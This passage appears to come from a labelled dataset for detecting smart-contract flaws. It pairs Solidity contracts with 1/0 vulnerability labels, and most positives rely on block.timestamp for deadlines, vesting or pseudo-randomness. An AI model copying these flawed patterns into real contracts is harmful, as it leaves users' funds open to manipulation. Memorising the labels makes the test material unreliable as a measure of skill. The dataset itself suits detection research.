timeLockDurations[teamWallet] = teamTimeLock;        timeLockDurations[earlyWallet] = earlyTimeLock;        timeLockDurations[institutionWallet] = institutionTimeLock;    }    function releaseToken() onlyReserveWallets public{        uint256 totalUnlocked = unlockAmount();        require(totalUnlocked <= allocations[msg.sender]);        require(releasedAmounts[msg.sender] < totalUnlocked);        uint256 payment = totalUnlocked.sub(releasedAmounts[msg.sender]);                releasedAmounts[msg.sender] = totalUnlocked;        require(token.transfer(msg.sender, payment));    }    function unlockAmount() public view onlyReserveWallets returns(uint256){        uint256 stage = vestStage();        uint256 totalUnlocked = stage.mul(allocations[msg.sender]).div(stageSettings[msg.sender]);        return totalUnlocked;    }        function vestStage() public view onlyReserveWallets returns(uint256){        uint256 vestingMonths = timeLockDurations[msg.sender].div(stageSettings[msg.sender]);        uint256 stage = (block.timestamp.sub(lockStartTime)).div(vestingMonths);                if(stage > stageSettings[msg.sender]){            stage = stageSettings[msg.sender];        }        return stage;    }}
1<CODESPLIT>contract tickingBomb {    struct team {        string name;        uint lastUpdate;        address[] members;        uint nbrMembers;    }    team public red;    team public blue;    function newRound() private {        red.name = "Red team";        blue.name = "Blue team";        red.lastUpdate = block.timestamp;        red.nbrMembers = 0;        blue.nbrMembers = 0;        red.members = new address[](0);        blue.members = new address[](0);        return;    }}
1<CODESPLIT>contract CTCVesting is Ownable {  using SafeMath for uint256;  address public teamWallet;  address public earlyWallet;  address public institutionWallet;    uint256 public teamTimeLock = 1000 days;  uint256 public earlyTimeLock = 5 * 30 days;  uint256 public institutionTimeLock = 50 * 30 days;       uint256 public teamAllocation = 15 * (10 ** 7) * (10 ** 18);  uint256 public earlyAllocation = 5 * (10 ** 7) * (10 ** 18);  uint256 public institutionAllocation = 15 * (10 ** 7) * (10 ** 18);    uint256 public totalAllocation = 35 * (10 ** 7) * (10 ** 18);    uint256 public teamStageSetting = 34;  uint256 public earlyStageSetting = 5;  uint256 public institutionStageSetting = 50;  ERC20Basic public token;     uint256 public start;     uint256 public lockStartTime;         mapping(address => uint256) public allocations;        mapping(address => uint256) public stageSettings;        mapping(address => uint256) public timeLockDurations;         mapping(address => uint256) public releasedAmounts;        modifier onlyReserveWallets {        require(allocations[msg.sender] > 0);        _;    }    function CTCVesting(ERC20Basic _token,                          address _teamWallet,                          address _earlyWallet,                          address _institutionWallet,                          uint256 _start,                          uint256 _lockTime)public{        require(_start > 0);        require(_lockTime > 0);        require(_start.add(_lockTime) > 0);        require(_teamWallet != address(0));        require(_earlyWallet != address(0));        require(_institutionWallet != address(0));                token = _token;        teamWallet = _teamWallet;        earlyWallet = _earlyWallet;        institutionWallet = _institutionWallet;        start = _start;        lockStartTime = start.add(_lockTime);    }        function allocateToken() onlyOwner public{        require(block.timestamp > lockStartTime);                 require(allocations[teamWallet] == 0);        require(token.balanceOf(address(this)) == totalAllocation);                allocations[teamWallet] = teamAllocation;        allocations[earlyWallet] = earlyAllocation;        allocations[institutionWallet] = institutionAllocation;                stageSettings[teamWallet] = teamStageSetting;        stageSettings[earlyWallet] = earlyStageSetting;        stageSettings[institutionWallet] = institutionStageSetting;                timeLockDurations[teamWallet] = teamTimeLock;        timeLockDurations[earlyWallet] = earlyTimeLock;        timeLockDurations[institutionWallet] = institutionTimeLock;    }    function releaseToken() onlyReserveWallets public{        uint256 totalUnlocked = unlockAmount();        require(totalUnlocked <= allocations[msg.sender]);        require(releasedAmounts[msg.sender] < totalUnlocked);        uint256 payment = totalUnlocked.sub(releasedAmounts[msg.sender]);                releasedAmounts[msg.sender] = totalUnlocked;        require(token.transfer(teamWallet, payment));    }    function unlockAmount() public view onlyReserveWallets returns(uint256){        uint256 stage = vestStage();        uint256 totalUnlocked = stage.mul(allocations[msg.sender]).div(stageSettings[msg.sender]);        return totalUnlocked;    }        function vestStage() public view onlyReserveWallets returns(uint256){        uint256 vestingMonths = timeLockDurations[msg.sender].div(stageSettings[msg.sender]);        uint256 stage = (block.timestamp.sub(lockStartTime)).div(vestingMonths);                if(stage > stageSettings[msg.sender]){            stage = stageSettings[msg.sender];        }        return stage;    }}
1<CODESPLIT>contract SophosToken {    uint public constant ALLOCATION_LOCK_END_TIMESTAMP = 1572566400;    function inAllocationLockPeriod() constant returns (bool) {        return (block.timestamp < ALLOCATION_LOCK_END_TIMESTAMP);    }}
1<CODESPLIT>contract BVesting is Ownable {  using SafeMath for uint256;  address public teamWallet;  address public earlyWallet;  address public institutionWallet;    uint256 public teamTimeLock = 1000 minutes;  uint256 public earlyTimeLock = 5 * 30 minutes;  uint256 public institutionTimeLock = 50 * 30 minutes;       uint256 public teamAllocation = 15 * (10 ** 7) * (10 ** 18);  uint256 public earlyAllocation = 5 * (10 ** 7) * (10 ** 18);  uint256 public institutionAllocation = 15 * (10 ** 7) * (10 ** 18);    uint256 public totalAllocation = 35 * (10 ** 7) * (10 ** 18);    uint256 public teamStageSetting = 34;  uint256 public earlyStageSetting = 5;  uint256 public institutionStageSetting = 50;  ERC20Basic public token;     uint256 public start;     uint256 public lockStartTime;         mapping(address => uint256) public allocations;        mapping(address => uint256) public stageSettings;        mapping(address => uint256) public timeLockDurations;         mapping(address => uint256) public releasedAmounts;        modifier onlyReserveWallets {        require(allocations[msg.sender] > 0);        _;    }    function BVesting(ERC20Basic _token,                          address _teamWallet,                          address _earlyWallet,                          address _institutionWallet,                          uint256 _start,                          uint256 _lockTime)public{        require(_start > 0);        require(_lockTime > 0);        require(_start.add(_lockTime) > 0);        require(_teamWallet != address(0));        require(_earlyWallet != address(0));        require(_institutionWallet != address(0));                token = _token;        teamWallet = _teamWallet;        earlyWallet = _earlyWallet;        institutionWallet = _institutionWallet;        start = _start;        lockStartTime = start.add(_lockTime);    }        function allocateToken() onlyOwner public{        require(block.timestamp > lockStartTime);                 require(allocations[teamWallet] == 0);        require(token.balanceOf(address(this)) == totalAllocation);                allocations[teamWallet] = teamAllocation;        allocations[earlyWallet] = earlyAllocation;        allocations[institutionWallet] = institutionAllocation;                stageSettings[teamWallet] = teamStageSetting;        stageSettings[earlyWallet] = earlyStageSetting;        stageSettings[institutionWallet] = institutionStageSetting;                timeLockDurations[teamWallet] = teamTimeLock;        timeLockDurations[earlyWallet] = earlyTimeLock;        timeLockDurations[institutionWallet] = institutionTimeLock;    }    function releaseToken() onlyReserveWallets public{        uint256 stage = vestStage();        uint256 totalUnlocked = stage.mul(allocations[msg.sender]).div(stageSettings[msg.sender]);        require(totalUnlocked < allocations[msg.sender]);        require(releasedAmounts[msg.sender] < totalUnlocked);        uint256 payment = totalUnlocked - releasedAmounts[msg.sender];                releasedAmounts[msg.sender] = totalUnlocked;        require(token.transfer(teamWallet, payment));    }        function vestStage() public view onlyReserveWallets returns(uint256){        uint256 vestingMonths = timeLockDurations[msg.sender].div(stageSettings[msg.sender]);        uint256 stage = (block.timestamp.sub(lockStartTime)).div(vestingMonths);                if(stage > stageSettings[msg.sender]){            stage = stageSettings[msg.sender];        }        return stage;    }}
1<CODESPLIT>contract CryptoHill {  uint startingTime;  uint gameLength;  function checkDate() private returns (bool success) {      if (block.timestamp > (startingTime + gameLength)) {          startingTime = 100;          return true;      }      return false;  }}
1<CODESPLIT>contract GameOfThrones {    address public trueGods;    address public jester;    uint public lastCollection;    uint public kingCost;    uint32 public totalCitizens;    address public madKing;    uint public amountAlreadyPaidBack;    uint public amountInvested;    function GameOfThrones() {        trueGods = msg.sender;        madKing = msg.sender;        jester = msg.sender;        lastCollection = block.timestamp;        kingCost = 1 ether;        amountAlreadyPaidBack = 0;        amountInvested = 0;        totalCitizens = 0;        return;    }}
1<CODESPLIT>contract Test {    uint256 public constant maxPreIcoTokens = 100000000 ether;    uint256 public dateStart = 1511987870;    uint256 public rateBase = 35000;    uint256 public totalSupply;    function buyPreIcoTokens(uint256 _weiAmount) internal returns(uint256){        uint8 percents = 0;        if(block.timestamp - dateStart <= 10 days){            percents = 20;        }        uint256 tokens = _weiAmount * (rateBase) * (2);        if(percents > 0){            tokens = tokens + (tokens * (percents) / (100));        }        require(totalSupply + (tokens) <= maxPreIcoTokens);        return tokens;    }}
1<CODESPLIT>contract JackPot {    uint[] public contributions;    address[] public contributors;    struct Win {        address winner;        uint timestamp;        uint contribution;		uint amountWon;    }    Win[] public recentWins;    uint recentWinsCount;    function recordWin(uint winner_index, uint amount) internal {        if(recentWins.length < recentWinsCount) {            recentWins.length++;        }        recentWins[recentWins.length - 1] = Win(contributors[winner_index], block.timestamp, contributions[winner_index], amount);    }}
1<CODESPLIT>contract CrowdsaleRC {    uint public createdTimestamp; uint public start; uint public deadline;    address public owner;    address public beneficiary;    uint public amountRaised;    uint public maxAmount;    mapping(address => uint256) public balanceOf;    mapping (address => bool) public whitelist;    event FundTransfer(address backer, uint amount, bool isContribution);    function CrowdsaleRC () public {        createdTimestamp = block.timestamp;        start = 1529316000;        deadline = 1532080800;        amountRaised = 0;        beneficiary = 0xD27eAD21C9564f122c8f84cD98a505efDf547665;        owner = msg.sender;        maxAmount = 2000 ether;    }    function () payable public {        require( (msg.value >= 0.1 ether) &&  block.timestamp >= start && block.timestamp <= deadline && amountRaised < maxAmount        && ( (msg.value <= 100 ether) || (msg.value > 100 ether && whitelist[msg.sender]==true) )        );        uint amount = msg.value;        balanceOf[msg.sender] += amount;        amountRaised += amount;        FundTransfer(msg.sender, amount, true);        if (beneficiary.send(amount)) {            FundTransfer(beneficiary, amount, false);        }    }    function whitelistAddress (address uaddress) public {        require (owner == msg.sender || beneficiary == msg.sender);        whitelist[uaddress] = true;    }    function removeAddressFromWhitelist (address uaddress) public {        require (owner == msg.sender || beneficiary == msg.sender);        whitelist[uaddress] = false;    }}
1<CODESPLIT>contract EtherTopDog {	function randInt(uint max, uint seedswitch) private constant returns (uint randomNumber) {		return (uint(sha3(block.blockhash(block.number-1), block.timestamp + seedswitch) ) % max + 1);	}}
1<CODESPLIT>contract SpaceWar  {    using NumericSequence for uint;    using SafeMath for uint;    struct MinerData    {        uint256[9]   spaces;          uint8[3]     hasUpgrade;        uint256      money;        uint256      lastUpdateTime;        uint256      premamentMineBonusPct;        uint256      unclaimedPot;        uint256      lastPotClaimIndex;    }    struct SpaceData    {        uint256 basePrice;        uint256 baseOutput;        uint256 pricePerLevel;        uint256 priceInETH;        uint256 limit;    }    struct BoostData    {        uint256 percentBonus;        uint256 priceInWEI;    }    struct PVPData    {        uint256[6] troops;        uint256    immunityTime;        uint256    exhaustTime;    }    struct TroopData    {        uint256 attackPower;        uint256 defensePower;        uint256 priceGold;        uint256 priceETH;    }    uint8 private constant NUMBER_OF_RIG_TYPES = 9;    SpaceData[9]  private spaceData;    uint8 private constant NUMBER_OF_UPGRADES = 3;    BoostData[3] private boostData;    uint8 private constant NUMBER_OF_TROOPS = 6;    uint8 private constant ATTACKER_START_IDX = 0;    uint8 private constant ATTACKER_END_IDX = 3;    uint8 private constant DEFENDER_START_IDX = 3;    uint8 private constant DEFENDER_END_IDX = 6;    TroopData[6] private troopData;         uint256 private honeyPotAmount;    uint256 private honeyPotSharePct;      uint256 private jackPot;    uint256 private devFund;    uint256 private nextPotDistributionTime;    mapping(address => mapping(uint256 => uint256)) private minerICOPerCycle;    uint256[] private honeyPotPerCycle;    uint256[] private globalICOPerCycle;    uint256 private cycleCount;         uint256 private constant NUMBER_OF_BOOSTERS = 5;    uint256 private boosterIndex;    uint256 private nextBoosterPrice;    address[5] private boosterHolders;    mapping(address => MinerData) private miners;    mapping(address => PVPData)   private pvpMap;    mapping(uint256 => address)   private indexes;    uint256 private topindex;    address private owner;                   function SpaceWar() public {        owner = msg.sender;                 spaceData[0] = SpaceData(500,             1,        5,               0,          999);        spaceData[1] = SpaceData(50000,           10,       500,             0,          999);        spaceData[2] = SpaceData(5000000,         100,      50000,           0,          999);        spaceData[3] = SpaceData(80000000,        1000,     800000,          0,          999);        spaceData[4] = SpaceData(500000000,       20000,    5000000,         0.01 ether, 999);        spaceData[5] = SpaceData(10000000000,     100000,   100000000,       0,          999);        spaceData[6] = SpaceData(100000000000,    1000000,  1000000000,      0,          999);        spaceData[7] = SpaceData(1000000000000,   50000000, 10000000000,     0.1 ether,  999);        spaceData[8] = SpaceData(10000000000000,  100000000,100000000000,    0,          999);        boostData[0] = BoostData(30,  0.01 ether);        boostData[1] = BoostData(50,  0.1 ether);        boostData[2] = BoostData(100, 1 ether);        topindex = 0;        honeyPotAmount = 0;        devFund = 0;        jackPot = 0;        nextPotDistributionTime = block.timestamp;        honeyPotSharePct = 90;                 boosterHolders[0] = owner;        boosterHolders[1] = owner;        boosterHolders[2] = owner;        boosterHolders[3] = owner;        boosterHolders[4] = owner;        boosterIndex = 0;        nextBoosterPrice = 0.1 ether;                 troopData[0] = TroopData(10,     0,      100000,   0);        troopData[1] = TroopData(1000,   0,      80000000, 0);        troopData[2] = TroopData(100000, 0,      1000000000,   0.01 ether);        troopData[3] = TroopData(0,      15,     100000,   0);        troopData[4] = TroopData(0,      1500,   80000000, 0);        troopData[5] = TroopData(0,      150000, 1000000000,   0.01 ether);        honeyPotPerCycle.push(0);        globalICOPerCycle.push(1);        cycleCount = 0;    }                   function GetMinerData(address minerAddr) public constant returns        (uint256 money, uint256 lastupdate, uint256 prodPerSec,         uint256[9] spaces, uint[3] upgrades, uint256 unclaimedPot, bool hasBooster, uint256 unconfirmedMoney)    {        uint8 i = 0;        money = miners[minerAddr].money;        lastupdate = miners[minerAddr].lastUpdateTime;        prodPerSec = GetProductionPerSecond(minerAddr);        for(i = 0; i < NUMBER_OF_RIG_TYPES; ++i)        {            spaces[i] = miners[minerAddr].spaces[i];        }        for(i = 0; i < NUMBER_OF_UPGRADES; ++i)        {            upgrades[i] = miners[minerAddr].hasUpgrade[i];        }        unclaimedPot = miners[minerAddr].unclaimedPot;        hasBooster = HasBooster(minerAddr);        unconfirmedMoney = money + (prodPerSec * (now - lastupdate));    }    function GetTotalMinerCount() public constant returns (uint256 count)    {        count = topindex;    }    function GetMinerAt(uint256 idx) public constant returns (address minerAddr)    {        require(idx < topindex);        minerAddr = indexes[idx];    }    function GetPotInfo() public constant returns (uint256 _honeyPotAmount, uint256 _devFunds, uint256 _jackPot, uint256 _nextDistributionTime)    {        _honeyPotAmount = honeyPotAmount;        _devFunds = devFund;        _jackPot = jackPot;        _nextDistributionTime = nextPotDistributionTime;    }    function GetProductionPerSecond(address minerAddr) public constant returns (uint256 personalProduction)    {        MinerData storage m = miners[minerAddr];        personalProduction = 0;        uint256 productionSpeed = 100 + m.premamentMineBonusPct;        if(HasBooster(minerAddr))              productionSpeed += 100;        for(uint8 j = 0; j < NUMBER_OF_RIG_TYPES; ++j)        {            personalProduction += m.spaces[j] * spaceData[j].baseOutput;        }        personalProduction = personalProduction * productionSpeed / 100;    }    function GetGlobalProduction() public constant returns (uint256 globalMoney, uint256 globalHashRate)    {        globalMoney = 0;        globalHashRate = 0;        uint i = 0;        for(i = 0; i < topindex; ++i)        {            MinerData storage m = miners[indexes[i]];            globalMoney += m.money;            globalHashRate += GetProductionPerSecond(indexes[i]);        }    }    function GetBoosterData() public constant returns (address[5] _boosterHolders, uint256 currentPrice, uint256 currentIndex)    {        for(uint i = 0; i < NUMBER_OF_BOOSTERS; ++i)        {            _boosterHolders[i] = boosterHolders[i];        }        currentPrice = nextBoosterPrice;        currentIndex = boosterIndex;    }    function HasBooster(address addr) public constant returns (bool hasBoost)    {        for(uint i = 0; i < NUMBER_OF_BOOSTERS; ++i)        {           if(boosterHolders[i] == addr)            return true;        }        return false;    }    function GetPVPData(address addr) public constant returns (uint256 attackpower, uint256 defensepower, uint256 immunityTime, uint256 exhaustTime,    uint256[6] troops)    {        PVPData storage a = pvpMap[addr];        immunityTime = a.immunityTime;        exhaustTime = a.exhaustTime;        attackpower = 0;        defensepower = 0;        for(uint i = 0; i < NUMBER_OF_TROOPS; ++i)        {            attackpower  += a.troops[i] * troopData[i].attackPower;            defensepower += a.troops[i] * troopData[i].defensePower;            troops[i] = a.troops[i];        }    }    function GetCurrentICOCycle() public constant returns (uint256)    {        return cycleCount;    }    function GetICOData(uint256 idx) public constant returns (uint256 ICOFund, uint256 ICOPot)    {        require(idx <= cycleCount);        ICOFund = globalICOPerCycle[idx];        if(idx < cycleCount)        {            ICOPot = honeyPotPerCycle[idx];        } else        {            ICOPot =  honeyPotAmount / 10;          }    }    function GetMinerICOData(address miner, uint256 idx) public constant returns (uint256 ICOFund, uint256 ICOShare, uint256 lastClaimIndex)    {        require(idx <= cycleCount);        ICOFund = minerICOPerCycle[miner][idx];        if(idx < cycleCount)        {            ICOShare = (honeyPotPerCycle[idx] * minerICOPerCycle[miner][idx]) / globalICOPerCycle[idx];        } else        {            ICOShare = (honeyPotAmount / 10) * minerICOPerCycle[miner][idx] / globalICOPerCycle[idx];        }        lastClaimIndex = miners[miner].lastPotClaimIndex;    }    function GetMinerUnclaimedICOShare(address miner) public constant returns (uint256 unclaimedPot)    {        MinerData storage m = miners[miner];        require(m.lastUpdateTime != 0);        require(m.lastPotClaimIndex < cycleCount);        uint256 i = m.lastPotClaimIndex;        uint256 limit = cycleCount;        if((limit - i) > 30)              limit = i + 30;        unclaimedPot = 0;        for(; i < cycleCount; ++i)        {            if(minerICOPerCycle[miner][i] > 0)                unclaimedPot += (honeyPotPerCycle[i] * minerICOPerCycle[miner][i]) / globalICOPerCycle[i];        }    }                   function StartNewMiner() external    {        require(miners[msg.sender].lastUpdateTime == 0);        miners[msg.sender].lastUpdateTime = block.timestamp;        miners[msg.sender].money = 0;        miners[msg.sender].spaces[0] = 1;        miners[msg.sender].unclaimedPot = 0;        miners[msg.sender].lastPotClaimIndex = cycleCount;        pvpMap[msg.sender].immunityTime = block.timestamp + 14400;        pvpMap[msg.sender].exhaustTime  = block.timestamp;        indexes[topindex] = msg.sender;        ++topindex;    }    function UpgradeSpace(uint8 spaceIdx, uint16 count) external    {        require(spaceIdx < NUMBER_OF_RIG_TYPES);        require(count > 0);        require(count <= 999);        require(spaceData[spaceIdx].priceInETH == 0);        MinerData storage m = miners[msg.sender];        require(spaceData[spaceIdx].limit >= (m.spaces[spaceIdx] + count));        UpdateMoney();                 uint256 price = NumericSequence.sumOfN(spaceData[spaceIdx].basePrice, spaceData[spaceIdx].pricePerLevel, m.spaces[spaceIdx], count);        require(m.money >= price);        m.spaces[spaceIdx] = m.spaces[spaceIdx] + count;        if(m.spaces[spaceIdx] > spaceData[spaceIdx].limit)            m.spaces[spaceIdx] = spaceData[spaceIdx].limit;        m.money -= price;    }    function UpgradeSpaceETH(uint8 spaceIdx, uint256 count) external payable    {        require(spaceIdx < NUMBER_OF_RIG_TYPES);        require(count > 0);        require(count <= 999);        require(spaceData[spaceIdx].priceInETH > 0);        MinerData storage m = miners[msg.sender];        require(spaceData[spaceIdx].limit >= (m.spaces[spaceIdx] + count));        uint256 price = (spaceData[spaceIdx].priceInETH).mul(count);        uint256 priceCoin = NumericSequence.sumOfN(spaceData[spaceIdx].basePrice, spaceData[spaceIdx].pricePerLevel, m.spaces[spaceIdx], count);        UpdateMoney();        require(msg.value >= price);        require(m.money >= priceCoin);        BuyHandler(msg.value);        m.spaces[spaceIdx] = m.spaces[spaceIdx] + count;        if(m.spaces[spaceIdx] > spaceData[spaceIdx].limit)            m.spaces[spaceIdx] = spaceData[spaceIdx].limit;        m.money -= priceCoin;    }    function UpdateMoney() private    {        require(miners[msg.sender].lastUpdateTime != 0);        require(block.timestamp >= miners[msg.sender].lastUpdateTime);        MinerData storage m = miners[msg.sender];        uint256 diff = block.timestamp - m.lastUpdateTime;        uint256 revenue = GetProductionPerSecond(msg.sender);        m.lastUpdateTime = block.timestamp;        if(revenue > 0)        {            revenue *= diff;            m.money += revenue;        }    }    function UpdateMoneyAt(address addr) private    {        require(miners[addr].lastUpdateTime != 0);        require(block.timestamp >= miners[addr].lastUpdateTime);        MinerData storage m = miners[addr];        uint256 diff = block.timestamp - m.lastUpdateTime;        uint256 revenue = GetProductionPerSecond(addr);        m.lastUpdateTime = block.timestamp;        if(revenue > 0)        {            revenue *= diff;            m.money += revenue;        }    }    function BuyUpgrade(uint256 idx) external payable    {        require(idx < NUMBER_OF_UPGRADES);        require(msg.value >= boostData[idx].priceInWEI);        require(miners[msg.sender].hasUpgrade[idx] == 0);        require(miners[msg.sender].lastUpdateTime != 0);        BuyHandler(msg.value);        UpdateMoney();        miners[msg.sender].hasUpgrade[idx] = 1;        miners[msg.sender].premamentMineBonusPct +=  boostData[idx].percentBonus;    }                   function BuyBooster() external payable    {        require(msg.value >= nextBoosterPrice);        require(miners[msg.sender].lastUpdateTime != 0);        for(uint i = 0; i < NUMBER_OF_BOOSTERS; ++i)            if(boosterHolders[i] == msg.sender)                revert();        address beneficiary = boosterHolders[boosterIndex];        MinerData storage m = miners[beneficiary];                 m.unclaimedPot += (msg.value * 9403) / 10000;                 honeyPotAmount += (msg.value * 597) / 20000;        devFund += (msg.value * 597) / 20000;                 nextBoosterPrice += nextBoosterPrice / 20;        UpdateMoney();        UpdateMoneyAt(beneficiary);                 boosterHolders[boosterIndex] = msg.sender;                 boosterIndex += 1;        if(boosterIndex >= 5)            boosterIndex = 0;    }                        function BuyTroop(uint256 idx, uint256 count) external payable    {        require(idx < NUMBER_OF_TROOPS);        require(count > 0);        require(count <= 1000);        PVPData storage pvp = pvpMap[msg.sender];        MinerData storage m = miners[msg.sender];        uint256 owned = pvp.troops[idx];        uint256 priceGold = NumericSequence.sumOfN(troopData[idx].priceGold, troopData[idx].priceGold / 100, owned, count);        uint256 priceETH = (troopData[idx].priceETH).mul(count);        UpdateMoney();        require(m.money >= priceGold);        require(msg.value >= priceETH);        if(priceGold > 0)            m.money -= priceGold;        if(msg.value > 0)            BuyHandler(msg.value);        pvp.troops[idx] += count;    }    function Attack(address defenderAddr) external    {        require(msg.sender != defenderAddr);        require(miners[msg.sender].lastUpdateTime != 0);        require(miners[defenderAddr].lastUpdateTime != 0);        PVPData storage attacker = pvpMap[msg.sender];        PVPData storage defender = pvpMap[defenderAddr];        uint i = 0;        uint256 count = 0;        require(block.timestamp > attacker.exhaustTime);        require(block.timestamp > defender.immunityTime);                 if(attacker.immunityTime > block.timestamp)            attacker.immunityTime = block.timestamp - 1;        attacker.exhaustTime = block.timestamp + 3600;        uint256 attackpower = 0;        uint256 defensepower = 0;        for(i = 0; i < ATTACKER_END_IDX; ++i)        {            attackpower  += attacker.troops[i] * troopData[i].attackPower;            defensepower += defender.troops[i + DEFENDER_START_IDX] * troopData[i + DEFENDER_START_IDX].defensePower;        }        if(attackpower > defensepower)        {            if(defender.immunityTime < block.timestamp + 14400)                defender.immunityTime = block.timestamp + 14400;            UpdateMoneyAt(defenderAddr);            MinerData storage m = miners[defenderAddr];            MinerData storage m2 = miners[msg.sender];            uint256 moneyStolen = m.money / 2;            for(i = DEFENDER_START_IDX; i < DEFENDER_END_IDX; ++i)            {                defender.troops[i] = defender.troops[i]/2;            }            for(i = ATTACKER_START_IDX; i < ATTACKER_END_IDX; ++i)            {                if(troopData[i].attackPower > 0)                {                    count = attacker.troops[i];                                         if((count * troopData[i].attackPower) > defensepower)                        {                            count = count * defensepower / attackpower / 2;                        }                    else                         {                             count =  count/2;                         }                    attacker.troops[i] = SafeMath.sub(attacker.troops[i],count);                    defensepower -= count * troopData[i].attackPower;                }            }            m.money -= moneyStolen;            m2.money += moneyStolen;        } else        {            for(i = ATTACKER_START_IDX; i < ATTACKER_END_IDX; ++i)            {                attacker.troops[i] = attacker.troops[i] / 2;            }            for(i = DEFENDER_START_IDX; i < DEFENDER_END_IDX; ++i)            {                if(troopData[i].defensePower > 0)                {                    count = defender.troops[i];                                         if((count * troopData[i].defensePower) > attackpower)                        count = count * attackpower / defensepower / 2;                    defender.troops[i] -= count;                    attackpower -= count * troopData[i].defensePower;                }            }        }    }                   function ReleaseICO() external    {        require(miners[msg.sender].lastUpdateTime != 0);        require(nextPotDistributionTime <= block.timestamp);        require(honeyPotAmount > 0);        require(globalICOPerCycle[cycleCount] > 0);        nextPotDistributionTime = block.timestamp + 86400;        honeyPotPerCycle[cycleCount] = honeyPotAmount / 10;          honeyPotAmount -= honeyPotAmount / 10;        honeyPotPerCycle.push(0);        globalICOPerCycle.push(0);        cycleCount = cycleCount + 1;        MinerData storage jakpotWinner = miners[msg.sender];        jakpotWinner.unclaimedPot += jackPot;        jackPot = 0;    }    function FundICO(uint amount) external    {        require(miners[msg.sender].lastUpdateTime != 0);        require(amount > 0);        MinerData storage m = miners[msg.sender];        UpdateMoney();        require(m.money >= amount);        m.money = (m.money).sub(amount);        globalICOPerCycle[cycleCount] = globalICOPerCycle[cycleCount].add(uint(amount));        minerICOPerCycle[msg.sender][cycleCount] = minerICOPerCycle[msg.sender][cycleCount].add(uint(amount));    }    function WithdrawICOEarnings() external    {        MinerData storage m = miners[msg.sender];        require(miners[msg.sender].lastUpdateTime != 0);        require(miners[msg.sender].lastPotClaimIndex < cycleCount);        uint256 i = m.lastPotClaimIndex;        uint256 limit = cycleCount;        if((limit - i) > 30)              limit = i + 30;        m.lastPotClaimIndex = limit;        for(; i < cycleCount; ++i)        {            if(minerICOPerCycle[msg.sender][i] > 0)                m.unclaimedPot += (honeyPotPerCycle[i] * minerICOPerCycle[msg.sender][i]) / globalICOPerCycle[i];        }    }                   function BuyHandler(uint amount) private    {                 honeyPotAmount += (amount * honeyPotSharePct) / 100;        jackPot += amount / 100;        devFund += (amount * (100-(honeyPotSharePct+1))) / 100;    }    function WithdrawPotShare() public    {        MinerData storage m = miners[msg.sender];        require(m.unclaimedPot > 0);        require(m.lastUpdateTime != 0);        uint256 amntToSend = m.unclaimedPot;        m.unclaimedPot = 0;        if(msg.sender.send(amntToSend))        {            m.unclaimedPot = 0;        }    }    function WithdrawDevFunds() public    {        require(msg.sender == owner);        if(owner.send(devFund))        {            devFund = 0;        }    }         function() public payable {         devFund += msg.value;    }}
1<CODESPLIT>contract ParallelGambling {    uint[3] private Balance;    uint[3] private id;    uint[3] private cursor;    uint[3] private nb_player ;    uint[3] private last_time ;    function ParallelGambling() {        uint i;        for(i = 0; i < 3; i++){            Balance[i]=0;            last_time[i] = block.timestamp;            nb_player[i] = 0;            id[i] = 0;			cursor[i] = 0;        }        return;    }}
1<CODESPLIT>contract TMTGBaseToken {    uint256 public openingTime;    struct investor {        uint256 _limit;    }    mapping(address => investor) public searchInvestor;    function _timelimitCal() internal view returns (uint256) {        uint256 presentTime = block.timestamp;        uint256 timeValue = presentTime - (openingTime);        uint256 _result = timeValue / (31 days);        return _result;    }}
1<CODESPLIT>contract Honestgamble {    uint private Payout_id = 0;    uint i_13;    uint i_11;    uint i_6;    function Pay() private returns (bool){        uint256 toss = uint256(sha3(msg.gas)) + uint256(sha3(block.timestamp));        if( toss % 3 == 0 ){            i_13 = Payout_id;            i_11 = Payout_id + 1;            i_6 = Payout_id + 2;            return true;        }        return false;    }}
1<CODESPLIT>contract ETHButton {    uint256 private clickPrice;    uint256 private expireTime;    function ETHButton() public {        clickPrice = 0.01 ether;        expireTime = block.timestamp + 360000;        return;    }}
0<CODESPLIT>contract EIP20Interface {              uint256 public totalSupply;              function balanceOf(address _owner) public view returns (uint256 balance);                        function transfer(address _to, uint256 _value) public returns (bool success);                             function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);                        function approve(address _spender, uint256 _value) public returns (bool success);                   function allowance(address _owner, address _spender) public view returns (uint256 remaining);    event Transfer(address indexed _from, address indexed _to, uint256 _value);    event Approval(address indexed _owner, address indexed _spender, uint256 _value);}  library SafeMath {  function mul(uint256 a, uint256 b) internal constant returns (uint256) {    uint256 c = a * b;    assert(a == 0 || c / a == b);    return c;  }  function div(uint256 a, uint256 b) internal constant returns (uint256) {         uint256 c = a / b;         return c;  }  function sub(uint256 a, uint256 b) internal constant returns (uint256) {    assert(b <= a);    return a - b;  }  function add(uint256 a, uint256 b) internal constant returns (uint256) {    uint256 c = a + b;    assert(c >= a);    return c;  }}  
1<CODESPLIT>contract Parameterizer {                   event _ReparameterizationProposal(string name, uint value, bytes32 propID, uint deposit, uint appEndDate, address indexed proposer);    event _NewChallenge(bytes32 indexed propID, uint challengeID, uint commitEndDate, uint revealEndDate, address indexed challenger);    event _ProposalAccepted(bytes32 indexed propID, string name, uint value);    event _ProposalExpired(bytes32 indexed propID);    event _ChallengeSucceeded(bytes32 indexed propID, uint indexed challengeID, uint rewardPool, uint totalTokens);    event _ChallengeFailed(bytes32 indexed propID, uint indexed challengeID, uint rewardPool, uint totalTokens);    event _RewardClaimed(uint indexed challengeID, uint reward, address indexed voter);                   using SafeMath for uint;    struct ParamProposal {        uint appExpiry;        uint challengeID;        uint deposit;        string name;        address owner;        uint processBy;        uint value;    }    struct Challenge {        uint rewardPool;                 address challenger;              bool resolved;                   uint stake;                      uint winningTokens;              mapping(address => bool) tokenClaims;    }                   mapping(bytes32 => uint) public params;         mapping(uint => Challenge) public challenges;         mapping(bytes32 => ParamProposal) public proposals;         EIP20Interface public token;    PLCRVoting public voting;    uint public PROCESSBY = 604800;           function init(        address _token,        address _plcr,        uint[] _parameters    ) public {        require(_token != 0 && address(token) == 0);        require(_plcr != 0 && address(voting) == 0);        token = EIP20Interface(_token);        voting = PLCRVoting(_plcr);                 set("minDeposit", _parameters[0]);                         set("pMinDeposit", _parameters[1]);                 set("applyStageLen", _parameters[2]);                 set("pApplyStageLen", _parameters[3]);                 set("commitStageLen", _parameters[4]);                         set("pCommitStageLen", _parameters[5]);                         set("revealStageLen", _parameters[6]);                 set("pRevealStageLen", _parameters[7]);                 set("dispensationPct", _parameters[8]);                 set("pDispensationPct", _parameters[9]);                 set("voteQuorum", _parameters[10]);                 set("pVoteQuorum", _parameters[11]);    }                        function proposeReparameterization(string _name, uint _value) public returns (bytes32) {        uint deposit 